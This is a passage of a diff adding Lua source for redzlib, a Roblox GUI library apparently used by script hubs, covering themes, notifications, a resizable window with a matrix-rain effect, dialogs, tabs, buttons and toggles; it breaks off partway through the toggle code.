+			firstMatch = Icon
+		end
+	end
+	
+	return firstMatch or index
+end
+
+function redzlib:SetTheme(NewTheme)
+	if not VerifyTheme(NewTheme) then return end
+	
+	redzlib.Save.Theme = NewTheme
+	SaveJson("FR_HUB.json", redzlib.Save)
+	Theme = redzlib.Themes[NewTheme]
+	
+	Comnection:FireConnection("ThemeChanged", NewTheme)
+	table.foreach(redzlib.Instances, function(_,Val)
+		if Val.Type == "Gradient" then
+			Val.Instance.Color = Theme["Color Hub 1"]
+		elseif Val.Type == "Frame" then
+			Val.Instance.BackgroundColor3 = Theme["Color Hub 2"]
+		elseif Val.Type == "Stroke" then
+			Val.Instance[GetColor(Val.Instance)] = Theme["Color Stroke"]
+		elseif Val.Type == "Theme" then
+			Val.Instance[GetColor(Val.Instance)] = Theme["Color Theme"]
+		elseif Val.Type == "Text" then
+			Val.Instance[GetColor(Val.Instance)] = Theme["Color Text"]
+		elseif Val.Type == "DarkText" then
+			Val.Instance[GetColor(Val.Instance)] = Theme["Color Dark Text"]
+		elseif Val.Type == "ScrollBar" then
+			Val.Instance[GetColor(Val.Instance)] = Theme["Color Theme"]
+		end
+	end)
+end
+
+function redzlib:SetScale(NewScale)
+	NewScale = ViewportSize.Y / math.clamp(NewScale, 300, 2000)
+	UIScale, ScreenGui.Scale.Scale = NewScale, NewScale
+end
+
+local NotificationContainer = Create("Frame", ScreenGui, {
+	Name = "NotificationContainer",
+	Size = UDim2.new(0, 280, 1, 0),
+	Position = UDim2.new(1, -300, 1, -20),
+	AnchorPoint = Vector2.new(0, 1),
+	BackgroundTransparency = 1,
+	ZIndex = 999
+}, {
+	Create("UIListLayout", {
+		SortOrder = "LayoutOrder",
+		Padding = UDim.new(0, 8),
+		VerticalAlignment = "Bottom"
+	})
+})
+
+function redzlib:Notify(Configs)
+	local Title = Configs[1] or Configs.Title or "Notification"
+	local Description = Configs[2] or Configs.Description or Configs.Text or ""
+	local Duration = Configs[3] or Configs.Duration or 5
+	local Type = Configs.Type or "Info"
+	
+	local Colors = {
+		Info = Color3.fromRGB(88, 101, 242),
+		Success = Color3.fromRGB(157, 0, 255),
+		Warning = Color3.fromRGB(255, 193, 7),
+		Error = Color3.fromRGB(255, 17, 0)
+	}
+	
+	local TypeColor = Colors[Type] or Colors.Info
+	
+	local NotificationFrame = Create("Frame", NotificationContainer, {
+		Size = UDim2.new(1, 0, 0, 45),
+		BackgroundColor3 = Color3.fromRGB(4, 12, 4),
+		BackgroundTransparency = 0,
+		BorderSizePixel = 0,
+		ClipsDescendants = true
+	})
+	
+	Make("Corner", NotificationFrame, UDim.new(0, 12))
+	
+	local NotificationStroke = Create("UIStroke", NotificationFrame, {
+		Color = Color3.fromRGB(179, 0, 255),
+		Thickness = 2,
+		ApplyStrokeMode = "Border"
+	})
+	
+	local TitleLabel = Create("TextLabel", NotificationFrame, {
+		Size = UDim2.new(1, -20, 0, 16), 
+		Position = UDim2.new(0, 44, 0, 4),
+		BackgroundTransparency = 1,
+		Text = Title,
+		TextColor3 = Color3.fromRGB(255, 255, 255),
+		TextSize = 11,
+		Font = Enum.Font.GothamBold,
+		TextXAlignment = "Left",
+		TextTruncate = "AtEnd"
+	})
+	
+	local DescLabel = Create("TextLabel", NotificationFrame, {
+		Size = UDim2.new(1, -20, 0, 20),
+		Position = UDim2.new(0, 44, 0, 15), 
+		BackgroundTransparency = 1,
+		Text = Description,
+		TextColor3 = Color3.fromRGB(180, 180, 180),
+		TextSize = 9,
+		Font = Enum.Font.Gotham,
+		TextXAlignment = "Left",
+		TextWrapped = true
+	})
+
+	local Icon = Create("ImageLabel", NotificationFrame, {
+		Name = "NotificationIcon",
+		Size = UDim2.new(0, 32, 0, 32),
+		Position = UDim2.new(0, 6, 0.5, -20),
+		BackgroundTransparency = 1,
+		Image = "rbxassetid://113449060491896",
+		ZIndex = 1000
+	})
+	
+	local TimeBarBackground = Create("Frame", NotificationFrame, {
+		Size = UDim2.new(1, -16, 0, 3), 
+		Position = UDim2.new(0, 8, 1, -8),
+		AnchorPoint = Vector2.new(0, 1),
+		BackgroundColor3 = Color3.fromRGB(15, 35, 15),
+		BorderSizePixel = 0
+	})
+	
+	local TimeBarBgCorner = Create("UICorner", TimeBarBackground, {
+		CornerRadius = UDim.new(0, 6)
+	})
+	
+	local TimeBar = Create("Frame", TimeBarBackground, {
+		Size = UDim2.new(1, 0, 1, 0),
+		Position = UDim2.new(0, 0, 0, 0),
+		BackgroundColor3 = TypeColor,
+		BorderSizePixel = 0
+	})
+	
+	local TimeBarCorner = Create("UICorner", TimeBar, {
+		CornerRadius = UDim.new(0, 6)
+	})
+
+	local function RemoveNotification()
+		CreateTween({NotificationFrame, "Position", UDim2.new(1, 50, NotificationFrame.Position.Y.Scale, 0), 0.3})
+		CreateTween({NotificationFrame, "BackgroundTransparency", 1, 0.3})
+		CreateTween({NotificationStroke, "Transparency", 1, 0.3, true})
+		NotificationFrame:Destroy()
+	end
+	
+	NotificationFrame.Position = UDim2.new(1, 50, 0, 0)
+	CreateTween({NotificationFrame, "Position", UDim2.new(0, 0, 0, 0), 0.4})
+	
+	if Duration > 0 then
+		CreateTween({TimeBar, "Size", UDim2.new(0, 0, 1, 0), Duration})
+		
+		task.spawn(function()
+			task.wait(Duration)
+			if NotificationFrame and NotificationFrame.Parent then
+				RemoveNotification()
+			end
+		end)
+	end
+	
+	local Notification = {}
+	function Notification:Remove()
+		RemoveNotification()
+	end
+	
+	return Notification
+end
+
+
+function redzlib:MakeWindow(Configs)
+	local WTitle = Configs[1] or Configs.Name or Configs.Title or "redz Library V5"
+	local WMiniText = Configs[2] or Configs.SubTitle or "by : redz9999"
+	
+	Settings.ScriptFile = Configs[3] or Configs.SaveFolder or false
+	
+	local function LoadFile()
+		local File = Settings.ScriptFile
+		if type(File) ~= "string" then return end
+		if not readfile or not isfile then return end
+		local s, r = pcall(isfile, File)
+		
+		if s and r then
+			local s, _Flags = pcall(readfile, File)
+			
+			if s and type(_Flags) == "string" then
+				local s,r = pcall(function() return HttpService:JSONDecode(_Flags) end)
+				Flags = s and r or {}
+			end
+		end
+	end;LoadFile()
+	
+	local UISizeX, UISizeY = unpack(redzlib.Save.UISize)
+	local MainFrame = InsertTheme(Create("ImageButton", ScreenGui, {
+		Size = UDim2.fromOffset(UISizeX, UISizeY),
+		Position = UDim2.new(0.5, -UISizeX/2, 0.5, -UISizeY/2),
+		BackgroundTransparency = 0.15,
+		Name = "Hub"
+}), "Main")
+	Make("Gradient", MainFrame, {
+		Rotation = 45
+	})MakeDrag(MainFrame)
+	local MainCorner = Make("Corner", MainFrame)
+	local Components = Create("Folder", MainFrame, {
+		Name = "Components"
+	})
+	
+	local DropdownHolder = Create("Folder", ScreenGui, {
+		Name = "Dropdown"
+	})
+	
+	local TopBar = Create("Frame", Components, {
+		Size = UDim2.new(1, 0, 0, 28),
+		BackgroundTransparency = 1,
+		Name = "Top Bar"
+	})
+	
+	local Title = InsertTheme(Create("TextLabel", TopBar, {
+		Position = UDim2.new(0, 15, 0.5),
+		AnchorPoint = Vector2.new(0, 0.5),
+		AutomaticSize = "XY",
+		Text = WTitle,
+		TextXAlignment = "Left",
+		TextSize = 12,
+		TextColor3 = Theme["Color Text"],
+		BackgroundTransparency = 1,
+		Font = Enum.Font.FredokaOne,  --GothamMedium
+		Name = "Title"
+	}, {
+		InsertTheme(Create("TextLabel", {
+			Size = UDim2.fromScale(0, 1),
+			AutomaticSize = "X",
+			AnchorPoint = Vector2.new(0, 1),
+			Position = UDim2.new(1, 5, 0.9),
+			Text = WMiniText,
+			TextColor3 = Theme["Color Dark Greem"],
+			BackgroundTransparency = 1,
+			TextXAlignment = "Left",
+			TextYAlignment = "Bottom",
+			TextSize = 9,
+			Font = Enum.Font.Gotham,
+			Name = "SubTitle"
+		}), "DarkText")
+	}), "Text")
+	
+	local MainScroll = InsertTheme(Create("ScrollingFrame", Components, {
+		Size = UDim2.new(0, redzlib.Save.TabSize, 1, -TopBar.Size.Y.Offset),
+		ScrollBarImageColor3 = Theme["Color Theme"],
+		Position = UDim2.new(0, 0, 1, 0),
+		AnchorPoint = Vector2.new(0, 1),
+		ScrollBarThickness = 1.5,
+		BackgroundTransparency = 1,
+		ScrollBarImageTransparency = 0.2,
+		CanvasSize = UDim2.new(),
+		AutomaticCanvasSize = "Y",
+		ScrollingDirection = "Y",
+		BorderSizePixel = 0,
+		Name = "Tab Scroll"
+	}, {
+		Create("UIPadding", {
+			PaddingLeft = UDim.new(0, 10),
+			PaddingRight = UDim.new(0, 10),
+			PaddingTop = UDim.new(0, 10),
+			PaddingBottom = UDim.new(0, 10)
+		}), Create("UIListLayout", {
+			Padding = UDim.new(0, 5)
+		})
+	}), "ScrollBar")
+	
+	local Containers = Create("Frame", Components, {
+		Size = UDim2.new(1, -MainScroll.Size.X.Offset, 1, -TopBar.Size.Y.Offset),
+		AnchorPoint = Vector2.new(1, 1),
+		Position = UDim2.new(1, 0, 1, 0),
+		BackgroundTransparency = 1,
+		ClipsDescendants = true,
+		Name = "Containers"
+	})
+
+
+	
+	local MatrixContainer = Create("Frame", Containers, {
+		Size = UDim2.new(1, 0, 1, 0),
+		BackgroundTransparency = 1,
+		Name = "MatrixRain",
+		ZIndex = 0,
+		ClipsDescendants = true
+	})
+
+	local _chars = {"0","1","F","R","H","U","B","8","3","7","A","Z","f","r","h"}
+	local _COLS  = 22
+	local _colW  = 1 / _COLS
+	local _cols  = {}
+
+	for i = 1, _COLS do
+		local col = {
+			y      = -math.random() * 1.5,
+			speed  = 0.002 + math.random() * 0.005,
+			len    = math.random(5, 13),
+			frames = {}
+		}
+		for j = 1, col.len do
+			local lbl = Create("TextLabel", MatrixContainer, {
+				Size               = UDim2.new(_colW, -1, 0, 13),
+				Position           = UDim2.new((i-1)*_colW, 0, -0.15, 0),
+				BackgroundTransparency = 1,
+				Font               = Enum.Font.Code,
+				TextSize           = 9,
+				TextXAlignment     = Enum.TextXAlignment.Center,
+				Text               = _chars[math.random(#_chars)],
+				TextTransparency   = 1,
+				ZIndex             = 1
+			})
+			col.frames[j] = lbl
+		end
+		_cols[i] = col
+	end
+
+	local ParticleConnection = RunService.Heartbeat:Connect(function()
+		if not MatrixContainer.Visible then return end
+		for i = 1, _COLS do
+			local col = _cols[i]
+			col.y = col.y + col.speed
+			if col.y > 1.25 then
+				col.y     = -0.1 - math.random()*0.5
+				col.speed = 0.002 + math.random()*0.005
+				col.len   = math.random(5, 13)
+			end
+			for j = 1, #col.frames do
+				local f  = col.frames[j]
+				local yp = col.y - (j-1)*0.06
+				f.Position = UDim2.new((i-1)*_colW, 0, yp, 0)
+				local vis = yp >= -0.02 and yp <= 1.02
+				if not vis then
+					f.TextTransparency = 1
+				elseif j == 1 then
+					f.TextColor3       = Color3.fromRGB(180,255,180)
+					f.TextTransparency = 0
+				else
+					local a = 1-(j/#col.frames)
+					f.TextColor3       = Color3.fromRGB(0,math.floor(180*a),math.floor(55*a))
+					f.TextTransparency = math.max(0,1-a*1.6)
+				end
+				if math.random(1,12)==1 then
+					f.Text = _chars[math.random(#_chars)]
+				end
+			end
+		end
+	end)
+
+	local ControlSize1, ControlSize2 = MakeDrag(Create("ImageButton", MainFrame, {
+		Size = UDim2.new(0, 35, 0, 35),
+		Position = MainFrame.Size,
+		Active = true,
+		AnchorPoint = Vector2.new(0.8, 0.8),
+		BackgroundTransparency = 1,
+		Name = "Control Hub Size"
+	})), MakeDrag(Create("ImageButton", MainFrame, {
+		Size = UDim2.new(0, 20, 1, -30),
+		Position = UDim2.new(0, MainScroll.Size.X.Offset, 1, 0),
+		AnchorPoint = Vector2.new(0.5, 1),
+		Active = true,
+		BackgroundTransparency = 1,
+		Name = "Control Tab Size"
+	}))
+	
+	local function ControlSize()
+		local Pos1, Pos2 = ControlSize1.Position, ControlSize2.Position
+		ControlSize1.Position = UDim2.fromOffset(math.clamp(Pos1.X.Offset, 430, 1000), math.clamp(Pos1.Y.Offset, 200, 500))
+		ControlSize2.Position = UDim2.new(0, math.clamp(Pos2.X.Offset, 135, 250), 1, 0)
+		
+		MainScroll.Size = UDim2.new(0, ControlSize2.Position.X.Offset, 1, -TopBar.Size.Y.Offset)
+		Containers.Size = UDim2.new(1, -MainScroll.Size.X.Offset, 1, -TopBar.Size.Y.Offset)
+		MainFrame.Size = ControlSize1.Position
+	end
+	
+	ControlSize1:GetPropertyChangedSignal("Position"):Connect(ControlSize)
+	ControlSize2:GetPropertyChangedSignal("Position"):Connect(ControlSize)
+	
+	ConnectSave(ControlSize1, function()
+		if not Minimized then
+			redzlib.Save.UISize = {MainFrame.Size.X.Offset, MainFrame.Size.Y.Offset}
+			SaveJson("FR_HUB.json", redzlib.Save)
+		end
+	end)
+	
+	ConnectSave(ControlSize2, function()
+		redzlib.Save.TabSize = MainScroll.Size.X.Offset
+		SaveJson("FR_HUB.json", redzlib.Save)
+	end)
+	
+	local ButtonsFolder = Create("Folder", TopBar, {
+		Name = "Buttons"
+	})
+	
+	local CloseButton = Create("ImageButton", {
+		Size = UDim2.new(0, 14, 0, 14),
+		Position = UDim2.new(1, -10, 0.5),
+		AnchorPoint = Vector2.new(1, 0.5),
+		BackgroundTransparency = 1,
+		Image = "rbxassetid://10747384394",
+		AutoButtonColor = false,
+		Name = "Close"
+	})
+	
+	local MinimizeButton = SetProps(CloseButton:Clone(), {
+		Position = UDim2.new(1, -35, 0.5),
+		Image = "rbxassetid://10734896206",
+		Name = "Minimize"
+	})
+	
+	SetChildren(ButtonsFolder, {
+		CloseButton,
+		MinimizeButton
+	})
+	
+	local Minimized, SaveSize, WaitClick
+	local Window, FirstTab = {}, false
+	function Window:CloseBtn()
+		local Dialog = Window:Dialog({
+			Title = "Close",
+			Text = "Deseja realmente fechar o Drip Client? Ele contém recursos essenciais e fechar agora pode interromper funções importantes, causar falhas ou perder suas configurações. Cuidado antes de prosseguir!",
+			Options = {
+				{"Confirm", function()
+					ScreenGui:Destroy()
+				end},
+				{"Cancel"}
+			}
+		})
+	end
+	function Window:MinimizeBtn()
+		if WaitClick then return end
+		WaitClick = true
+		
+		if Minimized then
+			MinimizeButton.Image = "rbxassetid://10734896206"
+			CreateTween({MainFrame, "Size", SaveSize, 0.25, true})
+			ControlSize1.Visible = true
+			ControlSize2.Visible = true
+			for _, particle in pairs(ActiveParticles) do
+				if particle.Frame and particle.Frame.Parent then
+					particle.Frame.Visible = true
+				end
+			end
+			Minimized = false
+		else
+			MinimizeButton.Image = "rbxassetid://10734924532"
+			SaveSize = MainFrame.Size
+			ControlSize1.Visible = false
+			ControlSize2.Visible = false
+			for _, particle in pairs(ActiveParticles) do
+				if particle.Frame and particle.Frame.Parent then
+					particle.Frame.Visible = false
+				end
+			end
+			CreateTween({MainFrame, "Size", UDim2.fromOffset(MainFrame.Size.X.Offset, 28), 0.25, true})
+			Minimized = true
+		end
+		
+		WaitClick = false
+	end
+	function Window:Minimize()
+		MainFrame.Visible = not MainFrame.Visible
+	end
+	
+	function Window:SetThemeParticles(enabled)
+		MatrixContainer.Visible = enabled and true or false
+	end
+
+
+	function Window:Minimize()
+		MainFrame.Visible = not MainFrame.Visible
+	end
+function Window:AddMinimizeButton(Configs)
+	local Button = MakeDrag(Create("ImageButton", ScreenGui, {
+		Size = UDim2.fromOffset(60, 60),
+		Position = UDim2.fromScale(0.15, 0.15),
+		BackgroundTransparency = 1,
+		AutoButtonColor = false
+	}))
+
+	local Stroke, Corner
+
+	if Configs.Corner then
+		Corner = Make("Corner", Button)
+		SetProps(Corner, Configs.Corner)
+	end
+
+	if Configs.Stroke then
+		Stroke = Make("Stroke", Button)
+		SetProps(Stroke, Configs.Stroke)
+	end
+
+	SetProps(Button, Configs.Button)
+
+	Button.Activated:Connect(Window.Minimize)
+
+	return {
+		Stroke = Stroke,
+		Corner = Corner,
+		Button = Button
+	}
+end
+	function Window:Set(Val1, Val2)
+		if type(Val1) == "string" and type(Val2) == "string" then
+			Title.Text = Val1
+			Title.SubTitle.Text = Val2
+		elseif type(Val1) == "string" then
+			Title.Text = Val1
+		end
+	end
+	function Window:Dialog(Configs)
+		if MainFrame:FindFirstChild("Dialog") then return end
+		if Minimized then
+			Window:MinimizeBtn()
+		end
+		
+		local DTitle = Configs[1] or Configs.Title or "Dialog"
+		local DText = Configs[2] or Configs.Text or "This is a Dialog"
+		local DOptions = Configs[3] or Configs.Options or {}
+		
+		local Frame = Create("Frame", {
+			Active = true,
+			Size = UDim2.fromOffset(250 * 1.08, 150 * 1.08),
+			Position = UDim2.fromScale(0.5, 0.5),
+			AnchorPoint = Vector2.new(0.5, 0.5)
+		}, {
+			InsertTheme(Create("TextLabel", {
+				Font = Enum.Font.GothamBold,
+				Size = UDim2.new(1, 0, 0, 20),
+				Text = DTitle,
+				TextXAlignment = "Left",
+				TextColor3 = Theme["Color Text"],
+				TextSize = 15,
+				Position = UDim2.fromOffset(15, 5),
+				BackgroundTransparency = 1
+			}), "Text"),
+			InsertTheme(Create("TextLabel", {
+				Font = Enum.Font.GothamMedium,
+				Size = UDim2.new(1, -25),
+				AutomaticSize = "Y",
+				Text = DText,
+				TextXAlignment = "Left",
+				TextColor3 = Theme["Color Dark Text"],
+				TextSize = 12,
+				Position = UDim2.fromOffset(15, 25),
+				BackgroundTransparency = 1,
+				TextWrapped = true
+			}), "DarkText")
+		})Make("Gradient", Frame, {Rotation = 270})Make("Corner", Frame)
+		
+		local ButtonsHolder = Create("Frame", Frame, {
+			Size = UDim2.fromScale(1, 0.35),
+			Position = UDim2.fromScale(0, 1),
+			AnchorPoint = Vector2.new(0, 1),
+			BackgroundColor3 = Theme["Color Hub 2"],
+			BackgroundTransparency = 1
+		}, {
+			Create("UIListLayout", {
+				Padding = UDim.new(0, 10),
+				VerticalAlignment = "Center",
+				FillDirection = "Horizontal",
+				HorizontalAlignment = "Center"
+			})
+		})
+		
+		local Screen = InsertTheme(Create("Frame", MainFrame, {
+			BackgroundTransparency = 0.6,
+			Active = true,
+			BackgroundColor3 = Theme["Color Hub 2"],
+			Size = UDim2.new(1, 0, 1, 0),
+			BackgroundColor3 = Theme["Color Stroke"],
+			Name = "Dialog"
+		}), "Stroke")
+		
+		MainCorner:Clone().Parent = Screen
+		Frame.Parent = Screen
+		CreateTween({Frame, "Size", UDim2.fromOffset(250, 150), 0.2})
+		CreateTween({Frame, "Transparency", 0, 0.15})
+		CreateTween({Screen, "Transparency", 0.3, 0.15})
+		
+		local ButtonCount, Dialog = 1, {}
+		function Dialog:Button(Configs)
+			local Name = Configs[1] or Configs.Name or Configs.Title or ""
+			local Callback = Configs[2] or Configs.Callback or function()end
+			
+			ButtonCount = ButtonCount + 1
+			local Button = Make("Button", ButtonsHolder)
+			Make("Corner", Button)
+			SetProps(Button, {
+				Text = Name,
+				Font = Enum.Font.GothamBold,
+				TextColor3 = Theme["Color Text"],
+				TextSize = 12
+			})
+			
+			for _,Button in pairs(ButtonsHolder:GetChildren()) do
+				if Button:IsA("TextButton") then
+					Button.Size = UDim2.new(1 / ButtonCount, -(((ButtonCount - 1) * 20) / ButtonCount), 0, 32)
+				end
+			end
+			Button.Activated:Connect(Dialog.Close)
+			Button.Activated:Connect(Callback)
+		end
+		function Dialog:Close()
+			CreateTween({Frame, "Size", UDim2.fromOffset(250 * 1.08, 150 * 1.08), 0.2})
+			CreateTween({Screen, "Transparency", 1, 0.15})
+			CreateTween({Frame, "Transparency", 1, 0.15, true})
+			Screen:Destroy()
+		end
+		table.foreach(DOptions, function(_,Button)
+			Dialog:Button(Button)
+		end)
+		return Dialog
+	end
+	function Window:SelectTab(TabSelect)
+		if type(TabSelect) == "number" then
+			redzlib.Tabs[TabSelect].func:Enable()
+		else
+			for _,Tab in pairs(redzlib.Tabs) do
+				if Tab.Cont == TabSelect.Cont then
+					Tab.func:Enable()
+				end
+			end
+		end
+	end
+	
+	local ContainerList = {}
+	function Window:MakeTab(paste, Configs)
+		if type(paste) == "table" then Configs = paste end
+		local TName = Configs[1] or Configs.Title or "Tab!"
+		local TIcon = Configs[2] or Configs.Icon or ""
+		
+		TIcon = redzlib:GetIcon(TIcon)
+		if not TIcon:find("rbxassetid://") or TIcon:gsub("rbxassetid://", ""):len() < 6 then
+			TIcon = false
+		end
+		
+	local TabSelect = Make("Button", MainScroll, {
+			Size = UDim2.new(1, 0, 0, 24),
+			BackgroundColor3 = Color3.fromRGB(0, 140, 40)
+		})Make("Corner", TabSelect)
+		
+		local LabelTitle = InsertTheme(Create("TextLabel", TabSelect, {
+			Size = UDim2.new(1, TIcon and -25 or -15, 1),
+			Position = UDim2.fromOffset(TIcon and 25 or 15),
+			BackgroundTransparency = 1,
+			Font = Enum.Font.BuilderSansBold, --GothamMedium
+			Text = TName,
+			TextColor3 = Color3.fromRGB(255, 255, 255),
+			TextSize = 10,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			TextTransparency = (FirstTab and 0.3) or 0,
+			TextTruncate = "AtEnd"
+		}), "Text")
+		
+		local LabelIcon = InsertTheme(Create("ImageLabel", TabSelect, {
+			Position = UDim2.new(0, 8, 0.5),
+			Size = UDim2.new(0, 13, 0, 13),
+			AnchorPoint = Vector2.new(0, 0.5),
+			Image = TIcon or "",
+			BackgroundTransparency = 1,
+			ImageTransparency = (FirstTab and 0.3) or 0
+		}), "Text")
+		
+		local Selected = InsertTheme(Create("Frame", TabSelect, {
+			Size = FirstTab and UDim2.new(0, 4, 0, 4) or UDim2.new(0, 4, 0, 13),
+			Position = UDim2.new(0, 1, 0.5),
+			AnchorPoint = Vector2.new(0, 0.5),
+			BackgroundColor3 = Theme["Color Theme"],
+			BackgroundTransparency = FirstTab and 1 or 0
+		}), "Theme")Make("Corner", Selected, UDim.new(0.5, 0))
+		
+		local Container = InsertTheme(Create("ScrollingFrame", {
+			Size = UDim2.new(1, 0, 1, 0),
+			Position = UDim2.new(0, 0, 1),
+			AnchorPoint = Vector2.new(0, 1),
+			ScrollBarThickness = 1.5,
+			BackgroundTransparency = 1,
+			ScrollBarImageTransparency = 0.2,
+			ScrollBarImageColor3 = Theme["Color Theme"],
+			AutomaticCanvasSize = "Y",
+			ScrollingDirection = "Y",
+			BorderSizePixel = 0,
+			CanvasSize = UDim2.new(),
+			Name = ("Container %i [ %s ]"):format(#ContainerList + 1, TName)
+		}, {
+			Create("UIPadding", {
+				PaddingLeft = UDim.new(0, 10),
+				PaddingRight = UDim.new(0, 10),
+				PaddingTop = UDim.new(0, 10),
+				PaddingBottom = UDim.new(0, 10)
+			}), Create("UIListLayout", {
+				Padding = UDim.new(0, 5)
+			})
+		}), "ScrollBar")
+		
+		table.insert(ContainerList, Container)
+		
+		if not FirstTab then Container.Parent = Containers end
+		
+		local function Tabs()
+			if Container.Parent then return end
+			for _,Frame in pairs(ContainerList) do
+				if Frame:IsA("ScrollingFrame") and Frame ~= Container then
+					Frame.Parent = nil
+				end
+			end
+			Container.Parent = Containers
+			Container.Size = UDim2.new(1, 0, 1, 150)
+			table.foreach(redzlib.Tabs, function(_,Tab)
+				if Tab.Cont ~= Container then
+					Tab.func:Disable()
+				end
+			end)
+			CreateTween({Container, "Size", UDim2.new(1, 0, 1, 0), 0.3})
+			CreateTween({LabelTitle, "TextTransparency", 0, 0.35})
+			CreateTween({LabelIcon, "ImageTransparency", 0, 0.35})
+			CreateTween({Selected, "Size", UDim2.new(0, 4, 0, 13), 0.35})
+			CreateTween({Selected, "BackgroundTransparency", 0, 0.35})
+		end
+		TabSelect.Activated:Connect(Tabs)
+		
+		FirstTab = true
+		local Tab = {}
+		table.insert(redzlib.Tabs, {TabInfo = {Name = TName, Icon = TIcon}, func = Tab, Cont = Container})
+		Tab.Cont = Container
+		
+		function  Tab:Disable()
+			Container.Parent = nil
+			CreateTween({LabelTitle, "TextTransparency", 0.3, 0.35})
+			CreateTween({LabelIcon, "ImageTransparency", 0.3, 0.35})
+			CreateTween({Selected, "Size", UDim2.new(0, 4, 0, 4), 0.35})
+			CreateTween({Selected, "BackgroundTransparency", 1, 0.35})
+		end
+		function Tab:Enable()
+			Tabs()
+		end
+		function Tab:Visible(Bool)
+			Funcs:ToggleVisible(TabSelect, Bool)
+			Funcs:ToggleParent(Container, Bool, Containers)
+		end
+		function Tab:Destroy() TabSelect:Destroy() Container:Destroy() end
+		
+		function Tab:AddSection(Configs)
+			local SectionName = type(Configs) == "string" and Configs or Configs[1] or Configs.Name or Configs.Title or Configs.Section
+			
+			local SectionFrame = Create("Frame", Container, {
+				Size = UDim2.new(1, 0, 0, 20),
+				BackgroundTransparency = 1,
+				Name = "Option"
+			})
+			
+			local SectionLabel = InsertTheme(Create("TextLabel", SectionFrame, {
+				Font = Enum.Font.BuilderSansExtraBold,--GothamBold
+				Text = SectionName,
+				TextColor3 = Theme["Color Dark Purple"],
+				Size = UDim2.new(1, -25, 1, 0),
+				Position = UDim2.new(0, 30),
+				BackgroundTransparency = 1,
+				TextTruncate = "AtEnd",
+				TextSize = 11,
+				TextXAlignment = "Left"
+			}), "Text")
+			
+			local Section = {}
+			table.insert(redzlib.Options, {type = "Section", Name = SectionName, func = Section})
+			function Section:Visible(Bool)
+				if Bool == nil then SectionFrame.Visible = not SectionFrame.Visible return end
+				SectionFrame.Visible = Bool
+			end
+			function Section:Destroy()
+				SectionFrame:Destroy()
+			end
+			function Section:Set(New)
+				if New then
+					SectionLabel.Text = GetStr(New)
+				end
+			end
+			return Section
+		end
+		function Tab:AddParagraph(Configs)
+			local PName = Configs[1] or Configs.Title or "Paragraph"
+			local PDesc = Configs[2] or Configs.Text or ""
+			
+			local Frame, LabelFunc = ButtonFrame(Container, PName, PDesc, UDim2.new(1, -20))
+			
+			local Paragraph = {}
+			function Paragraph:Visible(...) Funcs:ToggleVisible(Frame, ...) end
+			function Paragraph:Destroy() Frame:Destroy() end
+			function Paragraph:SetTitle(Val)
+				LabelFunc:SetTitle(GetStr(Val))
+			end
+			function Paragraph:SetDesc(Val)
+				LabelFunc:SetDesc(GetStr(Val))
+			end
+			function Paragraph:Set(Val1, Val2)
+				if Val1 and Val2 then
+					LabelFunc:SetTitle(GetStr(Val1))
+					LabelFunc:SetDesc(GetStr(Val2))
+				elseif Val1 then
+					LabelFunc:SetDesc(GetStr(Val1))
+				end
+			end
+			return Paragraph
+		end
+		function Tab:AddButton(Configs)
+			local BName = Configs[1] or Configs.Name or Configs.Title or "Button!"
+			local BDescription = Configs.Desc or Configs.Description or ""
+			local Callback = Funcs:GetCallback(Configs, 2)
+			
+			local FButton, LabelFunc = ButtonFrame(Container, BName, BDescription, UDim2.new(1, -20))
+--Font 
+			local ButtonIcon = Create("ImageLabel", FButton, {
+				Size = UDim2.new(0, 14, 0, 14),
+				Position = UDim2.new(1, -10, 0.5),
+				AnchorPoint = Vector2.new(1, 0.5),
+				BackgroundTransparency = 1,
+				Image = "rbxassetid://126463403744337"
+			})
+			
+			FButton.Activated:Connect(function()
+				Funcs:FireCallback(Callback)
+			end)
+			
+			local Button = {}
+			function Button:Visible(...) Funcs:ToggleVisible(FButton, ...) end
+			function Button:Destroy() FButton:Destroy() end
+			function Button:Callback(...) Funcs:InsertCallback(Callback, ...) end
+			function Button:Set(Val1, Val2)
+				if type(Val1) == "string" and type(Val2) == "string" then
+					LabelFunc:SetTitle(Val1)
+					LabelFunc:SetDesc(Val2)
+				elseif type(Val1) == "string" then
+					LabelFunc:SetTitle(Val1)
+				elseif type(Val1) == "function" then
+					Callback = Val1
+				end
+			end
+			return Button
+		end
+		function Tab:AddToggle(Configs)
+			local TName = Configs[1] or Configs.Name or Configs.Title or "Toggle"
+			local TDesc = Configs.Desc or Configs.Description or ""
+			local Callback = Funcs:GetCallback(Configs, 3)
+			local Flag = Configs[4] or Configs.Flag or false
+			local Default = Configs[2] or Configs.Default or false
+			if CheckFlag(Flag) then Default = GetFlag(Flag) end
+			
+			local Button, LabelFunc = ButtonFrame(Container, TName, TDesc, UDim2.new(1, -38))
+			
+			local ToggleHolder = InsertTheme(Create("Frame", Button, {
+				Size = UDim2.new(0, 35, 0, 18),
+				Position = UDim2.new(1, -10, 0.5),
+				AnchorPoint = Vector2.new(1, 0.5),
+				BackgroundColor3 = Theme["Color Stroke"]
+			}), "Stroke")Make("Corner", ToggleHolder, UDim.new(0.5, 0))
+			
+			local Slider = Create("Frame", ToggleHolder, {
+				BackgroundTransparency = 1,
+				Size = UDim2.new(0.8, 0, 0.8, 0),
+				Position = UDim2.new(0.5, 0, 0.5, 0),
+				AnchorPoint = Vector2.new(0.5, 0.5)
+			})
+			
+			local Toggle = InsertTheme(Create("Frame", Slider, {
+				Size = UDim2.new(0, 12, 0, 12),
+				Position = UDim2.new(0, 0, 0.5),
+				AnchorPoint = Vector2.new(0, 0.5),
+				BackgroundColor3 = Theme["Color Theme"]
+			}), "Theme")Make("Corner", Toggle, UDim.new(0.5, 0))
+			
+			local WaitClick
+			local function SetToggle(Val)
+				if WaitClick then return end
+				
+				WaitClick, Default = true, Val
+				SetFlag(Flag, Default)
+				Funcs:FireCallback(Callback, Default)
+				if Default then
+					CreateTween({Toggle, "Position", UDim2.new(1, 0, 0.5), 0.25})
+					CreateTween({Toggle, "BackgroundTransparency", 0, 0.25})
+					CreateTween({Toggle, "AnchorPoint", Vector2.new(1, 0.5), 0.25, Wait or false})
+				else
+					CreateTween({Toggle, "Position", UDim2.new(0, 0, 0.5), 0.25})
+					CreateTween({Toggle, "BackgroundTransparency", 0.8, 0.25})
+					CreateTween({Toggle, "AnchorPoint", Vector2.new(0, 0.5), 0.25, Wait or false})
+				end
+				WaitClick = false
+			end;task.spawn(SetToggle, Default)
+			
+			Button.Activated:Connect(function()
+				SetToggle(not Default)
+			end)
+			
+			local Toggle = {}
